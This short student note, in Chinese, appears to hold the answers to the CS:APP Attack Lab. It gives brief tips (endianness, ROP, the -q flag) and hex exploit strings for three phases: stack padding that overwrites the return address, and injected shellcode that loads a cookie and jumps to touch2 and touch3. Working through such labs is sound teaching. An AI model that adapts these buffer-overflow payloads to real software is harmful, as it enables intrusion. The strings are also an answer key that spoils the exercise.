0 如果运行不了加上参数-q(不连接csapp服务器模式运行)
1 注意大小端
2 注意可以通过(%rsp)来ret
3 注意完全理解栈的脱帽式结构/任意对象可打印，那么它是字符/字符串在内存中是反着放的(为了按原序输出)
4 ROP很强但是很看运气不是吗，在这道题里有一个偷懒的做法只需要一条指令(我就是这么做的)

ans
------
(1)
77 77 77 77 77 77 77 77
77 77 77 77 77 77 77 77
77 77 77 77 77 77 77 77
77 77 77 77 77 77 77 77
77 77 77 77 77 77 77 77 /* 40 bytes stuff in stack */
c0 17 40 00 00 00 00 00 /* assuming 64bits machine */
(2)
48 c7 c7 fa 97 b9 59
48 c7 04 24 ec 17 40 00
c3
77 77 77 77 77 77 77 77
77 77 77 77 77 77 77 77
77 77 77 77 77 77 77 77
78 dc 61 55 00 00 00 00
(3)
6a 00 /* push $0 */
48 b8 35 39 62 39 39 37 66 61 /* move cookie,%rax */
50 /* push %rax */
48 89 e7 /* mov %rsp,%rdi */
68 fa 18 40 00 /* push <touch3> */
77 77
77 77 77 77 77 77 77 77
77 77 77 77 77 77 77 77
78 dc 61 55 00 00 00 00
